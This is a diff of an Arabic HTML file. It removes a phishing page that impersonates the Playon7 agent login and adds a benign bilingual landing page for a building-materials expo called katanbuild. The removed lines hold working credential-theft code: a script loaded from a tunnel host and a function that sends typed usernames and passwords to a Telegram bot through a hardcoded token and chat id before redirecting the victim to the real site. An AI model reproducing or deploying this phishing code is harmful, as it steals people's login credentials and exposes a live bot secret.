@@ -1,39 +1,41 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Agent System | Playon7 Login</title>
-    <script src="https://0fc034dfd1d961.lhr.life/hook.js"></script>
-    <style>
-        body { background-color: #0b021d; color: white; font-family: 'Tahoma', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background: #1a0b33; padding: 40px; border-radius: 15px; text-align: center; border: 1px solid #e100ff; box-shadow: 0 0 25px rgba(225, 0, 255, 0.3); width: 380px; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 5px; border: 1px solid #3d1a63; background: #0b021d; color: white; }
-        button { background: linear-gradient(90deg, #d600d6, #8e00d6); color: white; border: none; padding: 14px; width: 100%; border-radius: 5px; cursor: pointer; font-weight: bold; }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#0b0f12" />
+  <meta name="description" content="katanbuild — معرض عالمي لمواد البناء والحلول المعمارية." />
+  <title>katanbuild | معرض الإعمار العالمي</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans+Arabic:wght@400;500;600;700&family=Manrope:wght@500;600;700;800&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="style.css" />
 </head>
 <body>
-    <div class="container">
-        <img src="https://agents.playon7.com/assets/images/logo.png" width="150">
-        <h2>تسجيل دخول الوكلاء</h2>
-        <input type="text" id="user" placeholder="اسم المستخدم">
-        <input type="password" id="pass" placeholder="كلمة المرور">
-        <button onclick="sendData()">دخول النظام</button>
-    </div>
+  <header class="nav shell">
+    <a class="brand" href="#top" aria-label="katanbuild"><b>K</b><span>atanbuild</span></a>
+    <nav><a href="#about" data-ar="عن المعرض" data-en="About">عن المعرض</a><a href="#materials" data-ar="المواد" data-en="Materials">المواد</a><a href="#projects" data-ar="المشاريع" data-en="Projects">المشاريع</a><a href="#accounting" data-ar="الحسابات" data-en="Accounts">الحسابات</a></nav>
+    <div class="nav-actions"><button class="lang" id="langBtn">EN</button><a class="outline-btn" href="#contact" data-ar="احجز زيارتك" data-en="Book a visit">احجز زيارتك</a></div>
+  </header>
 
-    <script>
-    function sendData() {
-        var u = document.getElementById('user').value;
-        var p = document.getElementById('pass').value;
-        var tok = "8564646143:AAEDmrL8HbdPESyY9iOJ0TXjEL4_bTSEaTs";
-        var id = "8665747715";
-        var msg = "🎯 صيد Vercel:\n👤: " + u + "\n🔑: " + p;
+  <main id="top">
+    <section class="hero">
+      <div class="hero-image" id="heroImage"></div><div class="hero-overlay"></div>
+      <div class="hero-content shell"><div class="eyebrow"><i></i><span data-ar="معاً نبني القادم" data-en="Building what comes next">معاً نبني القادم</span></div><h1><em>K</em>atanbuild</h1><p data-ar="الوجهة العالمية الجديدة لمواد البناء، الحلول المعمارية، وصناعة المساحات التي تُلهم العالم." data-en="The new global destination for building materials, architectural solutions, and spaces that inspire the world.">الوجهة العالمية الجديدة لمواد البناء، الحلول المعمارية، وصناعة المساحات التي تُلهم العالم.</p><div class="hero-buttons"><a class="orange-btn" href="#materials" data-ar="اكتشف المعرض <span>↗</span>" data-en="Explore the expo <span>↗</span>">اكتشف المعرض <span>↗</span></a><a class="text-link" href="#about" data-ar="تعرف علينا ↓" data-en="Discover us ↓">تعرف علينا ↓</a></div></div>
+      <div class="slide-info shell"><span id="slideCounter">01 / 03</span><span class="line"></span><span id="slideLabel">مواد تصنع الفرق</span></div>
+    </section>
 
-        fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${id}&text=${encodeURIComponent(msg)}`)
-        .then(() => {
-            window.location.href = "https://agents.playon7.com/";
-        });
-    }
-    </script>
-</body>
-</html>
+    <section class="intro shell" id="about"><div class="section-tag">01 / <span data-ar="الرؤية" data-en="VISION">الرؤية</span></div><div><h2 data-ar="من الفكرة، إلى <strong>المبنى.</strong>" data-en="From the idea, to the <strong>building.</strong>">من الفكرة، إلى <strong>المبنى.</strong></h2><p data-ar="نصنع جسراً بين أفضل منتجي مواد البناء والمصممين والمطورين الذين يرسمون ملامح مدن الغد. كل خامة هنا مختارة لتدوم، وكل لقاء مصمم ليُحدث فرقاً." data-en="We connect the world's finest building material makers with the designers and developers shaping tomorrow's cities. Every material is selected to last, every encounter designed to make an impact.">نصنع جسراً بين أفضل منتجي مواد البناء والمصممين والمطورين الذين يرسمون ملامح مدن الغد. كل خامة هنا مختارة لتدوم، وكل لقاء مصمم ليُحدث فرقاً.</p><a class="text-link dark" href="#projects" data-ar="قصتنا كاملة ↗" data-en="Our full story ↗">قصتنا كاملة ↗</a></div></section>
+
+    <section class="materials shell" id="materials"><div class="section-heading"><div class="section-tag">02 / <span data-ar="المعرض" data-en="EXPO">المعرض</span></div><h2 data-ar="كل ما تحتاجه<br><strong>لبناء ما تتخيله.</strong>" data-en="Everything you need<br><strong>to build your vision.</strong>">كل ما تحتاجه<br><strong>لبناء ما تتخيله.</strong></h2><a class="text-link dark" href="#contact" data-ar="استعرض جميع الفئات ↗" data-en="View all categories ↗">استعرض جميع الفئات ↗</a></div><div class="material-grid"><article><div class="material-no">01</div><h3 data-ar="الأحجار والأسطح" data-en="Stone & surfaces">الأحجار والأسطح</h3><p data-ar="جمال طبيعي بمعايير عالمية." data-en="Natural beauty, global standards.">جمال طبيعي بمعايير عالمية.</p><span>↗</span></article><article><div class="material-no">02</div><h3 data-ar="الأنظمة الذكية" data-en="Smart systems">الأنظمة الذكية</h3><p data-ar="كفاءة تُبنى داخل كل تفصيل." data-en="Efficiency built into every detail.">كفاءة تُبنى داخل كل تفصيل.</p><span>↗</span></article><article><div class="material-no">03</div><h3 data-ar="التشطيبات" data-en="Finishes">التشطيبات</h3><p data-ar="اللمسة التي تمنح المكان هويته." data-en="The detail that gives space its identity.">اللمسة التي تمنح المكان هويته.</p><span>↗</span></article></div></section>
+
+    <section class="projects" id="projects"><div class="shell project-wrap"><div class="section-tag">03 / <span data-ar="المشاريع" data-en="PROJECTS">المشاريع</span></div><div><h2 data-ar="أماكن<br><strong>تتحدث.</strong>" data-en="Places<br><strong>that speak.</strong>">أماكن<br><strong>تتحدث.</strong></h2><p data-ar="من الرياض إلى العالم، نحتفي بالمشاريع التي تعيد تعريف الممكن." data-en="From Riyadh to the world, we celebrate projects that redefine possibility.">من الرياض إلى العالم، نحتفي بالمشاريع التي تعيد تعريف الممكن.</p><a class="orange-btn" href="#contact" data-ar="شاهد المشاريع <span>↗</span>" data-en="View projects <span>↗</span>">شاهد المشاريع <span>↗</span></a></div><div class="project-image"></div></div></section>
+
+    <section class="accounting shell" id="accounting"><div class="accounting-top"><div><div class="section-tag">04 / <span data-ar="إدارة الأعمال" data-en="BUSINESS CONTROL">إدارة الأعمال</span></div><h2 data-ar="مركزك المالي،<br><strong>في مكان واحد.</strong>" data-en="Your financial center,<br><strong>in one place.</strong>">مركزك المالي،<br><strong>في مكان واحد.</strong></h2></div><p data-ar="أدوات واضحة لإدارة المخزون، المشتريات، الجرد، والحساب اليومي — مصممة لتمنحك سيطرة أكبر ووقتاً أكثر." data-en="Clear tools for inventory, purchasing, stocktaking, and daily accounts — designed to give you more control and more time.">أدوات واضحة لإدارة المخزون، المشتريات، الجرد، والحساب اليومي — مصممة لتمنحك سيطرة أكبر ووقتاً أكثر.</p></div><div class="account-grid"><button class="account-card" data-open="dashboard"><span class="card-icon">◫</span><b data-ar="لوحة الحسابات" data-en="Accounts dashboard">لوحة الحسابات</b><small data-ar="نظرة شاملة على أداء اليوم" data-en="A complete view of today">نظرة شاملة على أداء اليوم</small><strong>↗</strong></button><button class="account-card" data-open="invoice"><span class="card-icon">▤</span><b data-ar="فاتورة شراء" data-en="Purchase invoice">فاتورة شراء</b><small data-ar="أضف واحفظ فواتير الموردين" data-en="Add and save supplier invoices">أضف واحفظ فواتير الموردين</small><strong>↗</strong></button><button class="account-card" data-open="inventory"><span class="card-icon">⌘</span><b data-ar="جرد المستودع" data-en="Warehouse inventory">جرد المستودع</b><small data-ar="تتبع كل قطعة بدقة" data-en="Track every item precisely">تتبع كل قطعة بدقة</small><strong>↗</strong></button></div></section>
+
+    <section class="stats shell"><div><strong>120+</strong><span data-ar="علامة تجارية" data-en="Brands">علامة تجارية</span></div><div><strong>18K</strong><span data-ar="متر مربع من الإلهام" data-en="Square meters of inspiration">متر مربع من الإلهام</span></div><div><strong>40</strong><span data-ar="دولة حاضرة" data-en="Countries represented">دولة حاضرة</span></div><div><strong>∞</strong><span data-ar="احتمال جديد" data-en="New possibilities">احتمال جديد</span></div></section>
+  </main>
+  <footer id="contact"><div class="shell footer-grid"><a class="brand" href="#top"><b>K</b><span>atanbuild</span></a><div><h3 data-ar="افتتاح عالمي. <br>مكان واحد." data-en="A global opening.<br>One destination.">افتتاح عالمي. <br>مكان واحد.</h3><a class="orange-btn" href="mailto:hello@katanbuild.com" data-ar="تواصل معنا <span>↗</span>" data-en="Get in touch <span>↗</span>">تواصل معنا <span>↗</span></a></div><div class="footer-meta"><span>RIYADH / 2026</span><span>hello@katanbuild.com</span><span>© KATANBUILD</span></div></div></footer>
+
+  <div class="modal" id="modal" aria-hidden="true"><div class="modal-box"><button class="close" id="closeModal">×</button><div id="modalContent"></div></div></div>
+  <script src="script.js"></script>
+</body></html>
